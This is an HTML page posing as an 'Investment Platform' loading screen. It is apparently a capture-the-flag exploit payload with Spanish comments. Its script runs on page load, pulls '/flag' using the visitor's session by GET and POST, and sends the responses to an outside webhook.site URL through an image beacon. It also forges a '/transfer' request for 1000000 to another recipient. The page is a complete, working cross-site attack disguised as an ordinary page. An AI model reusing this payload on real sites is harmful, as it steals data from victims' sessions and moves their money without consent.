<!DOCTYPE html>
<html>
<head>
    <title>Investment Platform</title>
</head>
<body>
    <h1>Loading Investment Opportunities...</h1>

    <script>
        const WEBHOOK = "https://webhook.site/b4cd18d9-c61a-4a6c-b21a-e4e66153f385";

        // Función para enviar datos al webhook
        function send(data) {
            var img = new Image();
            // Limitar longitud para URLs muy largas
            var truncated = data.length > 1000 ? data.substring(0, 1000) + "..." : data;
            img.src = WEBHOOK + "?data=" + encodeURIComponent(truncated);
            console.log("Sent:", truncated);
        }

        // Método 1: Usar fetch con GET (más probable que funcione)
        fetch('/flag')
            .then(response => {
                if (response.ok) {
                    return response.text();
                } else {
                    send('GET /flag failed with status: ' + response.status);
                    return Promise.reject('GET failed');
                }
            })
            .then(flag => {
                send('SUCCESS WITH GET: ' + flag);
            })
            .catch(error => {
                send('GET error: ' + error);
                
                // Método 2: Intentar con POST como en el código original
                function post(url, params={}){
                    var params_post = [];
                    for(const key in params){
                        params_post.push(`${key}=${params[key]}`);
                    }
                    var xhr = new XMLHttpRequest();
                    xhr.open("POST", url, false);
                    xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
                    try {
                        xhr.send(params_post.join("&"));
                        return xhr.responseText;
                    } catch(e) {
                        return "POST error: " + e.toString();
                    }
                }
                
                var result = post('/flag');
                send('POST result: ' + result);
                
                // Método 3: Si fallan ambos, intentar transferencia
                if (result.includes('405') || result.includes('error')) {
                    var transfer = post('/transfer', {
                        recipient: 'a',
                        amount: '1000000'
                    });
                    send('Transfer attempt: ' + transfer);
                }
            });

        // Método 4: También probar directamente la función view_flag
        setTimeout(() => {
            try {
                function post(url, params={}){
                    var params_post = [];
                    for(const key in params){
                        params_post.push(`${key}=${params[key]}`);
                    }
                    var xhr = new XMLHttpRequest();
                    xhr.open("POST", url, false);
                    xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
                    xhr.send(params_post.join("&"));
                    return xhr.responseText;
                }
                
                let res = post("/flag");
                send("Direct view_flag: " + res);
            } catch(e) {
                send("Direct view_flag error: " + e);
            }
        }, 1000);
    </script>
</body>
</html>
